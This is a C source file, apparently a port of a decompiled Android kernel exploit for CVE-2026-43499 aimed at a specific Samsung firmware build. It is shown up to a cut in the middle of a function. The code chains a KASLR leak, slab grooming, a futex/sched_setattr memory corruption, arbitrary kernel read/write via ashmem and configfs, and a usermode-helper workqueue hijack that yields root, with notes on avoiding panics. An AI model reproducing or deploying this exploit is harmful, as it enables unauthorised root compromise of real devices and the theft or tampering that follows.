/*
 * Clean-room port of cve-2026-43499-app-afzh3.so's entry point.
 *
 * Every function below carries a `source:` comment naming the address in
 * the closed .so it was decompiled from (Ghidra headless, this session).
 * Embedded constants were read directly out of the binary's .rodata via
 * `python3 -c "open(...).read()[addr:addr+N]"`, not invented.
 *
 * The current flow wires the supervisor, KASLR leak, reclaim grooming,
 * futex/FPSIMD trigger, ashmem AAR/AAW verification, and root UMH install.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <sys/system_properties.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#include "aar_aaw.h"
#include "dentry_fops_preflight.h"
#include "dentry_pipe_transport.h"
#include "futex_trigger.h"
#include "futex_witness.h"
#include "fops_install.h"
#include "groom.h"
#include "kaslr.h"
#include "pipe_physrw.h"
#include "root_umh.h"
#include "slabinfo.h"
#include "stage_stability.h"
#include "target_zzhl.h"

static int target_matches_zzhl(void) {
  char model[PROP_VALUE_MAX] = {0};
  char device[PROP_VALUE_MAX] = {0};
  char fingerprint[PROP_VALUE_MAX] = {0};
  struct utsname kernel;
  return __system_property_get("ro.product.model", model) > 0 &&
         __system_property_get("ro.product.device", device) > 0 &&
         __system_property_get("ro.build.fingerprint", fingerprint) > 0 &&
         uname(&kernel) == 0 &&
         strcmp(model, ZZHL_MODEL) == 0 &&
         strcmp(device, ZZHL_DEVICE) == 0 &&
         strcmp(fingerprint, ZZHL_FINGERPRINT) == 0 &&
         strcmp(kernel.release, ZZHL_KERNEL_RELEASE) == 0;
}

/* source: FUN_0010a9d8 -- getenv + strtol clamped to [min,max], falling
 * back to `fallback` on any parse error or out-of-range value. */
static int env_int_clamped(const char *name, int fallback, int min,
                            int max) {
  const char *raw = getenv(name);
  if (!raw || !*raw) {
    return fallback;
  }
  errno = 0;
  char *end = NULL;
  long value = strtol(raw, &end, 0);
  if (errno != 0 || end == raw || *end != '\0' || value < min ||
      value > max) {
    return fallback;
  }
  return (int)value;
}

/* source: FUN_0010aaa4 */
static int setenv_str(const char *name, const char *value) {
  return setenv(name, value, 1);
}

/* source: FUN_001048f8 + FUN_00104934 -- prints the closed binary's fixed
 * failure banner (bytes read at file offset 0x2155) and exits(-1). We keep
 * the same user-visible message since it is just a string, not logic. */
static void fatal_usage(void) {
  fwrite("\x1b[31m[!] \x1b[0moperation failed\n", 1, 33, stderr);
  exit(-1);
}

/* source: literal 8-entry int32 table at file offset 0x243c in
 * cve-2026-43499-app-afzh3.so, read with:
 *   python3 -c "import struct; d=open('...','rb').read();
 *     print(struct.unpack_from('<8i', d, 0x243c))"
 * -> (5000, 0, 10000, 30000, -5000, 20000, 15000, 25000)
 * Added to the base PSELECT_DELAY_USEC per attempt, indexed by
 * (attempt - 1) % 8. Same role as our own route_delay_usec() in fops.c,
 * just a different table. */
static const int32_t kAttemptDelayOffsetsUsec[8] = {
  5000, 0, 10000, 30000, -5000, 20000, 15000, 25000,
};

enum attempt_kernel_state {
  ATTEMPT_PRE_MUTATION = 0,
  ATTEMPT_MUTATION_PENDING = 1,
  ATTEMPT_KERNEL_MUTATED = 2,
  ATTEMPT_FOPS_RESTORED = 3,
  ATTEMPT_PIPE_READY = 4,
  ATTEMPT_WORKQUEUE_MUTATED = 5,
  ATTEMPT_ROOT_READY = 6,
};

/* A deliberate stop before groom/FUTEX. Keep distinct from a failed attempt:
 * the supervisor must not retry it and the host must not wait for a reboot. */
enum { ATTEMPT_SAFE_BLOCKED = 2 };

/* source: shared struct written by DAT_0010ea78 = mmap(NULL, 0x20,
 * PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0); 0x20 bytes.
 * Field layout inferred from the 32-bit/64-bit index arithmetic in the
 * decompile (DAT_0010ea78[1] as a 32-bit ready flag, then three 64-bit
 * fields at word indices 2/4/6) -- this is the child->parent P0 handoff. */
struct attempt_shared_state {
  int32_t status;              /* offset 0x00: enum attempt_kernel_state */
  int32_t dirty;                /* offset 0x04: P0 handoff published */
  uint64_t slide_p0_offset;     /* offset 0x08 */
  uint64_t p0_gate_page_struct; /* offset 0x10 */
  uint64_t p0_probe_page_struct;/* offset 0x18 */
};
_Static_assert(sizeof(struct attempt_shared_state) == 0x20,
               "attempt_shared_state must match the closed binary's mmap size");

static void pin_to_cpu(int cpu);
static void raise_rlimit_to_max(int resource);

/* source: FUN_001044f4 @ 0x47ec-0x48f0. The successful worker forks a
 * detached holder that inherits the reclaim sockets and keeps their pages
 * allocated after /system/bin/true exits. Use raw syscalls in the child: the
 * fork happens while the futex owner thread still exists. */
static pid_t spawn_allocation_keeper(void) {
  pid_t child = fork();
  if (child != 0) {
    return child;
  }

  syscall(SYS_prctl, PR_SET_PDEATHSIG, 0, 0, 0, 0);
  syscall(SYS_prctl, PR_SET_NAME, "cve43499-hold", 0, 0, 0);
  syscall(SYS_setsid);

  int null_fd = (int)syscall(SYS_openat, AT_FDCWD, "/dev/null",
                             O_RDWR | O_CLOEXEC, 0);
  if (null_fd >= 0) {
    for (int fd = STDIN_FILENO; fd <= STDERR_FILENO; fd++) {
      if (null_fd != fd) {
        syscall(SYS_dup3, null_fd, fd, 0);
      }
    }
    if (null_fd > STDERR_FILENO) {
      syscall(SYS_close, null_fd);
    }
  } else {
    syscall(SYS_close, STDIN_FILENO);
    syscall(SYS_close, STDOUT_FILENO);
    syscall(SYS_close, STDERR_FILENO);
  }

  const struct timespec hold = {.tv_sec = 86400, .tv_nsec = 0};
  for (;;) {
    syscall(SYS_nanosleep, &hold, NULL);
  }
}

/* source: test_root_immediate.c's post_trigger() -- verify AAR/AAW then
 * install root_umh, called from run_futex_trigger_cb()'s callback (same
 * thread, immediately after sched_setattr, before run_futex_trigger_cb
 * returns). */
struct do_one_attempt_ctx {
  uint64_t kernel_base;
  uint64_t payload_base;
  uint64_t selected_fops_addr;
  const char *root_umh_path;
  struct attempt_shared_state *shared;
  struct oss_fops_candidate candidates[OSS_FOPS_CANDIDATE_COUNT];
  struct oss_fops_candidate selected_candidate;
  uint64_t oracle_pipe_page;
  uint64_t ghost_task;
  uint64_t initial_lock;
  uint64_t write_lock;
  uint64_t cleanup_lock;
  unsigned char *oracle_snapshots;
};

static int do_one_attempt_post_trigger(void *ctx_v);

static uint64_t preflight_direct_to_page(void *opaque, uint64_t address) {
  (void)opaque;
  if (address < 0xffffff8000000000ULL ||
      address >= 0xffffff9000000000ULL) return 0;
  return 0xfffffffe00000000ULL +
         (((address - 0xffffff8000000000ULL) >> 12) * 0x40ULL);
}

static int preflight_deliver(void *opaque, const struct oss_futex_phase *phase) {
  struct do_one_attempt_ctx *ctx = opaque;
  return futex_v14_deliver_persistent_phase(phase, ctx->ghost_task);
}

static int preflight_verify(void *opaque,
                            const struct oss_fops_candidate *candidate,
                            int *changed_pipe) {
  struct do_one_attempt_ctx *ctx = opaque;
  unsigned char expected[DENTRY_FOPS_NAME_SIZE];
  struct oss_dentry_snapshot_match match;
  if (!build_reclaimable_dentry_fops_name(expected, ctx->kernel_base) ||
      !oss_p0_pipe_oracle_capture(ctx->oracle_snapshots,
          OSS_DENTRY_PIPE_COUNT * OSS_DENTRY_PIPE_SNAPSHOT_SIZE)) return -1;
  uint64_t base = candidate->object & ~0x7fffULL;
  int status = oss_dentry_fops_scan_snapshots(
      ctx->oracle_snapshots, OSS_DENTRY_PIPE_COUNT, base, base + 0x8000,
      candidate->page, expected, &match);
  *changed_pipe = match.changed_pipes == 1
                      ? (int)match.changed_pipe_index
                      : (match.changed_pipes == 0 ? -1 : -2);
  fprintf(stderr,
          "[preflight] object=%016llx page=%016llx status=%d changed=%zu "
          "exact=%zu links_bad=%zu image_bad=%zu pipe=%d\n",
          (unsigned long long)candidate->object,
          (unsigned long long)candidate->page, status, match.changed_pipes,
          match.exact_matches, match.link_mismatches,
          match.image_mismatches, *changed_pipe);
  return status;
}

static int preflight_advance(void *opaque) {
  (void)opaque;
  return oss_p0_pipe_oracle_advance();
}
static int preflight_narrow(void *opaque, size_t pipe_index) {
  (void)opaque;
  return oss_p0_pipe_oracle_narrow(pipe_index);
}
static int preflight_release(void *opaque) {
  (void)opaque;
  return oss_p0_pipe_oracle_release();
}
static int preflight_cleanup(void *opaque) {
  (void)opaque;
  return oss_p0_pipe_oracle_release_only();
}

static int do_one_attempt_preflight(void *opaque) {
  struct do_one_attempt_ctx *ctx = opaque;
  if (getenv("OSS_ROOT_FUTEX_WITNESS")) {
    struct oss_futex_witness witness;
    int waiter_tid = (int)syscall(SYS_gettid);
    if (!oss_read_futex_witness_trace(waiter_tid, &witness)) {
      fprintf(stderr, "[safe-stop] requested futex witness unavailable\n");
      return 0;
    }
    fprintf(stderr,
            "[futex-witness] diagnostic task=%016llx waiter=%016llx "
            "lock=%016llx\n",
            (unsigned long long)witness.task,
            (unsigned long long)witness.waiter,
            (unsigned long long)witness.lock);
  }
  struct oss_futex_multiphase_transport transport = {
      .ctx = ctx, .deliver = preflight_deliver, .verify = preflight_verify,
      .advance_pipe = preflight_advance, .narrow_pipe = preflight_narrow,
      .release_pipe = preflight_release, .cleanup_pipe = preflight_cleanup,
      .direct_to_page = preflight_direct_to_page,
  };
  struct oss_futex_multiphase_result result;
  int status = oss_run_futex_multiphase_preflight(
      ctx->candidates, ctx->oracle_pipe_page, ctx->initial_lock,
      &transport, &result);
  fprintf(stderr,
          "[preflight] result status=%d scanned=%zu selected=%zu pipe=%d\n",
          status, result.scanned, result.selected_candidate,
          result.changed_pipe);
  if (status != OSS_FOPS_PREFLIGHT_EXACT) {
    oss_pipe_rw_reset();
    return 0;
  }
  ctx->selected_candidate = ctx->candidates[result.selected_candidate];
  ctx->payload_base =
      ctx->selected_candidate.object & ~0x7fffULL;
  uint64_t fops = ctx->selected_candidate.object + 8;
  ctx->selected_fops_addr = fops;
  uint64_t target = ctx->kernel_base + ZZHL_ASHMEM_MISC_FOPS_OFF;
  struct oss_futex_phase write_phase = {
      .sequence = 2, .parent = (target & ~3ULL) - 8,
      .right = fops, .lock = ctx->write_lock};
  if (!futex_v14_deliver_persistent_phase(&write_phase, ctx->ghost_task))
    return 0;
  struct oss_futex_phase owner_clear = {
      .sequence = 3, .parent = (fops & ~3ULL) - 8,
      .right = 0, .lock = ctx->cleanup_lock};
  if (!futex_v14_deliver_persistent_phase(&owner_clear, ctx->ghost_task))
    return 0;
  return do_one_attempt_post_trigger(ctx);
}

/* source: dentry_fops_preflight.h transport -- READ-ONLY witness check over
 * the ashmem AAR/AAW primitive. The groom installs the fake file_operations
 * table at payload_base|0x1180 (fops_install.c); read64 reads that object
 * through the already-verified fd and returns 1 only on a full eight-byte
 * transfer, so a native size-zero ashmem read cannot forge a match.
 *
 * write64 is intentionally a no-op. Real AAR/AAW writes go through
 * configfs_bin_write_iter, which sets configfs_buffer.bin_buffer to the
 * target's high bits; a later free of that fake pointer panics the kernel
 * ("Trying to vfree() nonexistent vm area" -> __vunmap). The object is
 * already placed by the groom and apply_probe never mutates it, so the
 * scanner's restore write has nothing to undo: reporting success without
 * issuing an AAR/AAW write keeps the confirmed-working post-trigger flow
 * (restore -> pipe -> root) untouched. */
static int fops_preflight_read64(void *ctx, uint64_t address,
                                 uint64_t *value) {
  return oss_kernel_read(*(const int *)ctx, address, value, sizeof(*value));
}

static int fops_preflight_write64(void *ctx, uint64_t address,
                                  uint64_t value) {
  (void)ctx;
  (void)address;
  (void)value;
  return 1;
}

/* Placement is already done by the groom, so the probe is a no-op: the
 * scanner only confirms the installed object still reads as the witness. */
static int fops_preflight_probe(void *ctx,
                                const struct oss_fops_candidate *candidate) {
  (void)ctx;
  (void)candidate;
  return 1;
}

static int do_one_attempt_post_trigger(void *ctx_v) {
  struct do_one_attempt_ctx *ctx = (struct do_one_attempt_ctx *)ctx_v;
  uint64_t ashmem_misc_fops_addr =
      ctx->kernel_base + ZZHL_ASHMEM_MISC_FOPS_OFF;
  futex_v14_dbg("callback-entry"); /* H0: time from handshake entry to callback */

  /* This callback is gated on a successful sched_setattr. From this point the
   * kernel may reference the reclaimed object even when open/readback fails.
   * Mark the attempt unsafe before any syscall so the supervisor never retries
   * in the same boot and the allocation keeper is spawned on every exit path. */
  __atomic_store_n(&ctx->shared->status, ATTEMPT_KERNEL_MUTATED,
                   __ATOMIC_RELEASE);

  puts("\x1b[33m[*] \x1b[0mstage=verifying-kernel-access");
  int fd = oss_open_kernel_rw();
  if (fd < 0) {
    /* The node was opened successfully during preflight. Losing it after
     * sched_setattr can mean the global fops pointer changed. Retrying after
     * that would free the reclaimed page while the kernel may still use it. */
    fprintf(stderr, "[immediate] open resolved ashmem node failed\n");
    return 0;
  }
  /* Proven order (matches the closed binary that historically reaches
   * umh-root-socket-ok): full verify -- fops readback + magic R/W round trip --
   * THEN restore. The panic that ends the failed boots is __vunmap+0x304 ->
   * kfree+0xa4 (a vfree of the poisoned configfs bin_buffer), an async
   * free-time landmine, NOT the verify->restore latency: successful boots run
   * with the corruption live for ~5.5s before reaching root. Extra AAR/AAW in
   * this window (an earlier reorder + a pi_tree_entry read/write) only added
   * configfs operations that arm that free, so they were reverted. */
  int verified = oss_verify_kernel_access_ex(
      fd, ashmem_misc_fops_addr, ctx->selected_fops_addr,
      ctx->payload_base, NULL);
  fprintf(stderr, "[immediate] verify (called immediately, same thread) = %d\n",
          verified);
  if (!verified) {
    close(fd);
    return 0;
  }

  /* Item 2: reopen the sibling CPUs (gated; a no-op unless OSS_CPU_QUIET=1).
   * Closes the quiet window the trigger opened before sched_setattr. */
  oss_cpu_quiet_end();

  /* FUN_001076c0 restores ashmem_misc.fops to the real static table after
   * proving configfs AAR/AAW, while the already-open fd retains fake f_op and
   * remains usable for the root stage. This removes the global dangling
   * pointer before the sprayed page can ever be released. */
  uint64_t real_ashmem_fops = ctx->kernel_base + ZZHL_ASHMEM_FOPS_OFF;
  uint64_t restored_fops = 0;
  int restore_ok = oss_kernel_write(fd, ashmem_misc_fops_addr,
                                    &real_ashmem_fops,
                                    sizeof(real_ashmem_fops)) &&
                   oss_kernel_read(fd, ashmem_misc_fops_addr, &restored_fops,
                                   sizeof(restored_fops)) &&
                   restored_fops == real_ashmem_fops;
  fprintf(stderr,
          "[immediate] restore ashmem_misc.fops got=%016llx want=%016llx ok=%d\n",
          (unsigned long long)restored_fops,
          (unsigned long long)real_ashmem_fops, restore_ok);
  if (!restore_ok) {
    close(fd);
    return 0;
  }
  __atomic_store_n(&ctx->shared->status, ATTEMPT_FOPS_RESTORED,
                   __ATOMIC_RELEASE);

  /* Item 3: repair the victim task's pi_waiters so the scheduler stops walking
   * the fake pi-chain planted by the sched_setattr/rb_erase corruption. This
   * needs the PROVEN victim task_struct address; init_task is NOT it (observed
   * empty) and a blind RB root/leftmost write without the task's pi_lock can
   * panic. So the write is armed only when the operator supplies a resolved
   * address via OSS_PI_REPAIR_VICTIM=<hex> (e.g. from a kprobe/debug run). The
   * legacy OSS_PI_DIAG_INITTASK / OSS_PI_REPAIR_INITTASK stay read-only. */
  {
    const char *victim_env = getenv("OSS_PI_REPAIR_VICTIM");
    if (victim_env && *victim_env) {
      uint64_t victim = strtoull(victim_env, NULL, 0);
      uint64_t root_addr = victim + ZZHL_TASK_PI_WAITERS_ROOT_OFF;
      uint64_t leftmost_addr = victim + ZZHL_TASK_PI_WAITERS_LEFTMOST_OFF;
      uint64_t root_before = 0, leftmost_before = 0;
      int read_ok =
          oss_kernel_read(fd, root_addr, &root_before, sizeof(root_before)) &&
          oss_kernel_read(fd, leftmost_addr, &leftmost_before,
                          sizeof(leftmost_before));
      uint64_t empty = 0;
      int write_ok =
          oss_kernel_write(fd, root_addr, &empty, sizeof(empty)) &&
          oss_kernel_write(fd, leftmost_addr, &empty, sizeof(empty));
      fprintf(stderr,
              "[pi-repair] victim=%016llx pi_waiters.rb_root=%016llx "
              "rb_leftmost=%016llx read=%d write_empty=%d\n",
              (unsigned long long)victim, (unsigned long long)root_before,
              (unsigned long long)leftmost_before, read_ok, write_ok);
    } else if (getenv("OSS_PI_DIAG_INITTASK") ||
               getenv("OSS_PI_REPAIR_INITTASK")) {
      uint64_t init_task = ctx->kernel_base + ZZHL_INIT_TASK_OFF;
      uint64_t root_addr = init_task + ZZHL_TASK_PI_WAITERS_ROOT_OFF;
      uint64_t leftmost_addr = init_task + ZZHL_TASK_PI_WAITERS_LEFTMOST_OFF;
      uint64_t root_before = 0;
      uint64_t leftmost_before = 0;
      int repair_read =
          oss_kernel_read(fd, root_addr, &root_before, sizeof(root_before)) &&
          oss_kernel_read(fd, leftmost_addr, &leftmost_before,
                          sizeof(leftmost_before));
      fprintf(stderr,
              "[pi-diag] init_task=%016llx pi_waiters.rb_root=%016llx "
              "rb_leftmost=%016llx read=%d (no write)\n",
              (unsigned long long)init_task, (unsigned long long)root_before,
              (unsigned long long)leftmost_before, repair_read);
    }
  }

  /* source: oss_dentry_fops_preflight (dentry_fops_preflight.c). Confirm the
   * dynamically selected object is a kernel-visible file_operations
   * witness: read owner/flush/release and require an EXACT match on the built
   * witness triplet (owner=0, flush=0, release=ashmem_release).
   *
   * OFF by default and now runs AFTER the fops restore, so its extra AAR/AAW
   * reads no longer sit in the verify->restore window. Redundant confirmation
   * of what oss_verify_magic_rw already proved; set OSS_DENTRY_PREFLIGHT=1 to
   * re-check the witness while debugging. */
  if (getenv("OSS_DENTRY_PREFLIGHT")) {
  const struct oss_fops_candidate fops_candidate = {
      .page = ctx->selected_fops_addr & ~0xfffULL,
      .object = ctx->selected_fops_addr,
      /* This readback-only adapter does not dereference pipe_buffer, but the
       * generic candidate contract requires a live, nonzero object address. */
      .pipe_buffer = ctx->selected_fops_addr,
  };
  const struct oss_fops_triplet fops_expected = {
      .owner = 0,
      .flush = ctx->kernel_base + ZZHL_ITER_FILE_SPLICE_WRITE_OFF,
      .release = ctx->kernel_base + ZZHL_ASHMEM_RELEASE_OFF,
  };
  struct oss_fops_preflight_transport fops_transport = {
      .ctx = &fd,
      .apply_probe = fops_preflight_probe,
      .read64 = fops_preflight_read64,
      .write64 = fops_preflight_write64,
  };
  struct oss_fops_preflight_result fops_result;
  int fops_status = oss_dentry_fops_preflight(&fops_candidate, 1, &fops_expected,
                                              &fops_transport, &fops_result);
  fprintf(stderr,
          "[dentry-preflight] status=%d scanned=%zu selected=%zd observed "
          "owner=%016llx flush=%016llx release=%016llx want release=%016llx\n",
          fops_status, fops_result.scanned, (ssize_t)fops_result.selected,
          (unsigned long long)fops_result.observed.owner,
          (unsigned long long)fops_result.observed.flush,
          (unsigned long long)fops_result.observed.release,
          (unsigned long long)fops_expected.release);
  if (fops_status != OSS_FOPS_PREFLIGHT_EXACT) {
    fprintf(stderr,
            "[dentry-preflight] no kernel-visible FOPS witness; aborting "
            "before global fops write\n");
    close(fd);
    return 0;
  }
  } /* OSS_DENTRY_PREFLIGHT */

  puts("\x1b[33m[*] \x1b[0mstage=starting-temporary-root");
  if (!oss_pipe_rw_install(fd, ctx->kernel_base, ctx->payload_base)) {
    fprintf(stderr, "[immediate] pipe physical R/W install failed\n");
    close(fd);
    return 0;
  }
  __atomic_store_n(&ctx->shared->status, ATTEMPT_PIPE_READY,
                   __ATOMIC_RELEASE);

  /* root_umh uses configfs only for SELinux and the static workqueue slot;
   * dynamic slab state uses pipe R/W. Phase 3 already cleared the selected
   * FOPS owner through cleanup_lock; do not issue a redundant late AAW. */
  int rooted = root_umh_install_fd_tracked(
      fd, ctx->kernel_base, ctx->payload_base, ctx->root_umh_path,
      &ctx->shared->status, ATTEMPT_WORKQUEUE_MUTATED);
  close(fd);
  if (rooted) {
    __atomic_store_n(&ctx->shared->status, ATTEMPT_ROOT_READY,
                     __ATOMIC_RELEASE);
    puts("\x1b[32m[+] \x1b[0mstage=temporary-root-ready");
  }
  return rooted;
}

/* source: FUN_001044f4 -- one complete exploit attempt. */
static int do_one_attempt(struct attempt_shared_state *shared,
                           int pselect_delay_usec) {
  (void)pselect_delay_usec;
  if (!oss_stage_stability_gate("preparing-kernel-access")) return 0;
  puts("\x1b[33m[*] \x1b[0mstage=preparing-kernel-access");

  raise_rlimit_to_max(RLIMIT_NOFILE);
  raise_rlimit_to_max(RLIMIT_NPROC);

  /* FUN_001044f4 calls FUN_001057e0 before KASLR and grooming. Do not
   * trigger the corruption unless its later FUN_00105968 open can succeed. */
  if (!oss_prepare_kernel_rw_path()) {
    fprintf(stderr, "[aar_aaw] no openable ashmem node before exploit\n");
    return 0;
  }
  pin_to_cpu(0);

  /* source: FUN_001044f4 -- puts("stage=locating-kernel"); FUN_0010757c(). */
  if (!oss_stage_stability_gate("locating-kernel")) return 0;
  puts("\x1b[33m[*] \x1b[0mstage=locating-kernel");
  uint64_t kernel_base = 0;
  uint64_t p0_offset = 0;
  /* source: FUN_0010757c. A forced P0 offset does not skip tracefs: the
   * closed binary still prefers its canonical tracefs result and uses the
   * 64-KiB-aligned offset only as fallback. */
  const char *forced_offset = getenv("SLIDE_P0_OFFSET");
  int has_forced_offset = forced_offset && *forced_offset;
  if (has_forced_offset) {
    errno = 0;
    char *end = NULL;
    p0_offset = strtoull(forced_offset, &end, 0);
    if (errno || end == forced_offset || *end != '\0' ||
        p0_offset > 0x1f8000ULL || (p0_offset & 0x7fffULL) != 0) {
      fprintf(stderr, "[kaslr] invalid SLIDE_P0_OFFSET\n");
      return 0;
    }
  }
  if (!kaslr_locate_via_tracefs(&kernel_base)) {
    if (!has_forced_offset) {
      return 0;
    }
    kernel_base = ZZHL_KIMAGE_TEXT_BASE + p0_offset;
    fprintf(stderr,
            "[kaslr] source=forced-p0 base=%016llx p0_offset=%016llx\n",
            (unsigned long long)kernel_base,
            (unsigned long long)p0_offset);
  }
  puts("\x1b[33m[*] \x1b[0mstage=kernel-location-ready");
  __atomic_store_n(&shared->p0_gate_page_struct, 0, __ATOMIC_RELEASE);
  __atomic_store_n(&shared->p0_probe_page_struct, 0, __ATOMIC_RELEASE);
  __atomic_store_n(&shared->slide_p0_offset, p0_offset, __ATOMIC_RELEASE);
  __atomic_store_n(&shared->dirty, 1, __ATOMIC_RELEASE);

  /* source: FUN_001044f4 -- explicit KASLR-only diagnostic mode. */
  if (getenv("SLIDE_ONLY") || getenv("P0_ONLY") ||
      getenv("OSS_VALIDATE_ONLY")) {
    fprintf(stderr,
            "[mode] safe validation set: stopping after KASLR "
            "locate, as designed\n");
    return 1;
  }

  if (!oss_stage_stability_gate("critical-route")) return 0;
  fprintf(stderr,
          "[stage-gate] stage=critical-route gate=3/3; "
          "groom->oracle->futex->write->restore is atomic\n");

#if !ZZHL_DENTRY_FOPS_PREFLIGHT_IMPLEMENTED
  /* Do not allocate/reclaim slabs either. The old placement-only route
   * reached do_dentry_open with file_operations.owner=0x1270 and panicked.
   * Require a retained dentry/pipe witness before a global FOPS write.
   *
   * OSS_UNSAFE_BYPASS_PREFLIGHT=1 is an OPT-IN override for a single
   * instrumented validation run of the post-trigger changes (item 1 restore
   * reorder, item 2 CPU-quiet). It re-enables the exact route this gate was
   * added to stop, so a wrong FOPS-witness assumption panics/reboots the
   * device. Default (unset) stays safe. */
  if (!getenv("OSS_UNSAFE_BYPASS_PREFLIGHT")) {
    fprintf(stderr,
            "[safe-stop] dentry-preflight unavailable: stopping before groom/trigger; "
            "payload_base is not a kernel-visible FOPS witness\n");
    return ATTEMPT_SAFE_BLOCKED;
  }
  fprintf(stderr,
          "[UNSAFE] OSS_UNSAFE_BYPASS_PREFLIGHT set: proceeding to groom/trigger "
          "WITHOUT a kernel-visible FOPS witness; reboot risk accepted\n");
#endif

  /* source: FUN_00106288 opens with a diagnostic FUN_00106ec0() call
   * (/proc/slabinfo "mm_struct" line) before ever forking/spraying.
   * Ported faithfully as read_mm_slabinfo() (src/slabinfo.c). Read-only,
   * safe. */
  struct mm_slabinfo before;
  if (read_mm_slabinfo(&before)) {
    fprintf(stderr,
            "[kaslr] mm_struct slabinfo active=%lu num=%lu objsize=%lu "
            "objperslab=%lu active_slabs=%lu num_slabs=%lu\n",
            before.active_objs, before.num_objs, before.objsize,
            before.objperslab, before.active_slabs, before.num_slabs);
  } else {
    fprintf(stderr, "[kaslr] /proc/slabinfo mm_struct line not found\n");
  }

  /* ZZHL offsets from the extracted kernel image and kallsyms. */
  uint64_t init_task_addr = kernel_base + ZZHL_INIT_TASK_OFF;
  uint64_t ashmem_misc_fops_addr = kernel_base + ZZHL_ASHMEM_MISC_FOPS_OFF;

  /* source: FUN_00106288 in full -- groom.c ports the exact-match
   * fork/kill/leak/drain/spray choreography (see groom.h) and writes
   * build_fops_install_object()'s corrected fields into the reclaimed
   * page. Still no real trigger fired: the kernel now merely *contains*
   * our bytes at payload_base, nothing has read task->pi_blocked_on
   * into it yet. */
  /* FUN_00107dd4 is a separate later primitive in the closed binary. It
   * does not wrap FUN_00106288 and its 480 pipes must not perturb this
   * fake-fops reclaim window. */
  struct oss_fops_candidate candidates[OSS_FOPS_CANDIDATE_COUNT];
  if (groom_fops_candidates(kernel_base, ashmem_misc_fops_addr,
                            init_task_addr, candidates) !=
      OSS_FOPS_CANDIDATE_COUNT) {
    fprintf(stderr, "[groom] failed to retain four dentry candidates\n");
    return 0;
  }
  uint64_t oracle_pipe_page = 0;
  if (!oss_prepare_p0_pipe_oracle(&oracle_pipe_page)) {
    fprintf(stderr, "[pipe] p0 oracle preparation failed\n");
    return 0;
  }

  /* source: FUN_00103e18 (waiter) + FUN_00104274 (owner) + FUN_00104300
   * (consumer/sched_setattr trigger). See futex_trigger.c for the
   * triple-verified derivation. This is the first real kernel-touching
   * trigger in this clean-room engine -- everything before this point
   * (tracefs, kernelsnitch leak, groom+spray) is read-only or userspace
   * reclaim only. */
  /* source: root_umh.h -- same call_usermodehelper_exec_work workqueue
   * hijack the closed binary's FUN_00108fa4 performs, reused as-is
   * (see root_umh.h header comment). root_umh_path is this project's
   * matching ZZHL UMH helper (build/dm3q-S918BXXUAZZHL/
   * cve-2026-43499-root), staged on-device and passed the same way the
   * real app passes CVE43499_ROOT_HELPER. */
  const char *root_umh_path = getenv("CVE43499_ROOT_HELPER");
  if (!root_umh_path || root_umh_path[0] != '/') {
    fprintf(stderr, "[root_umh] missing CVE43499_ROOT_HELPER\n");
    return 0;
  }

  /* source: run_futex_trigger_v11_{cb,full} (futex_trigger.h/.c) --
   * supersedes v10 in this wiring. v10's own comment claimed the real
   * verify-call gate (G+0x760) "never opens... never written to a
   * nonzero value anywhere r2 can resolve statically", and so called
   * the callback unconditionally from the main thread after the whole
   * routine joined, instead of from inside the waiter thread the way
   * the real binary does. Re-disassembling the consumer
   * (fcn.00004300, raw vaddr 0x4494-0x44ac) directly with `pd` (not
   * `axt`/xref search) found the actual write: `bl 0x3650`, and 0x3650
   * is `__aarch64_atomic_fetch_add4_relax` (`ldaddal w0,w0,[x1]` at raw
   * vaddr 0x3660) -- an LSE atomic increment, which a plain "find a
   * str writing a nonzero constant" search will never surface. The
   * gate genuinely opens on every successful sched_setattr. v11 =
   * v10's waiter body (no SIGUSR2/delay to owner, yield-spin instead
   * of usleep -- both already correct) with the callback moved back
   * into the waiter thread, gated on g_sched_setattr_ok, matching the
   * real fcn.000076c0 call site (raw vaddr 0x4150) exactly. */
  /* BISECT_VARIANT is a project-only diagnostic switch. The default v14
   * now carries the closed -1 -> gate -> SIGUSR1 -> 1 -> sched_setattr
   * handshake and keeps the post-sigreturn window free of libc/syscalls. */
  int ghostlock_slot = env_int_clamped(
      "GHOSTLOCK_BSS_SLOT", 0, 0, ZZHL_SIGRETURN_BSS_SLOT_MAX);
  uint64_t sigreturn_bss = kernel_base + ZZHL_SIGRETURN_BSS_BASE_OFF;
  uint64_t sigreturn_slot =
      sigreturn_bss + (uint64_t)ghostlock_slot * ZZHL_SIGRETURN_BSS_SLOT_STRIDE;
  fprintf(stderr,
          "[futex-v14] ghostlock slot=%d bss=%016llx ghost_task=%016llx "
          "locks=%016llx/%016llx/%016llx\n",
          ghostlock_slot, (unsigned long long)sigreturn_bss,
          (unsigned long long)(sigreturn_bss +
                               ZZHL_SIGRETURN_GHOST_TASK_DELTA),
          (unsigned long long)(sigreturn_slot +
                               ZZHL_SIGRETURN_INITIAL_LOCK_DELTA),
          (unsigned long long)(sigreturn_slot +
                               ZZHL_SIGRETURN_WRITE_LOCK_DELTA),
          (unsigned long long)(sigreturn_slot +
                               ZZHL_SIGRETURN_CLEANUP_LOCK_DELTA));
  struct do_one_attempt_ctx ctx = {
      .kernel_base = kernel_base,
      .payload_base = 0,
      .root_umh_path = root_umh_path,
      .shared = shared,
      .oracle_pipe_page = oracle_pipe_page,
      .ghost_task = sigreturn_bss + ZZHL_SIGRETURN_GHOST_TASK_DELTA,
      .initial_lock = sigreturn_slot + ZZHL_SIGRETURN_INITIAL_LOCK_DELTA,
      .write_lock = sigreturn_slot + ZZHL_SIGRETURN_WRITE_LOCK_DELTA,
      .cleanup_lock = sigreturn_slot + ZZHL_SIGRETURN_CLEANUP_LOCK_DELTA,
  };
  memcpy(ctx.candidates, candidates, sizeof(candidates));
  ctx.oracle_snapshots = malloc(OSS_DENTRY_PIPE_COUNT *
                                OSS_DENTRY_PIPE_SNAPSHOT_SIZE);
  if (!ctx.oracle_snapshots) {
    oss_pipe_rw_reset();
    return 0;
  }

  const char *bisect = getenv("BISECT_VARIANT");
  int triggered;
  if (bisect && strcmp(bisect, "13") == 0) {
    fprintf(stderr, "[futex] BISECT_VARIANT=13 blocked: no pre-mutation state\n");
    free(ctx.oracle_snapshots);
    oss_pipe_rw_reset();
    return 0;
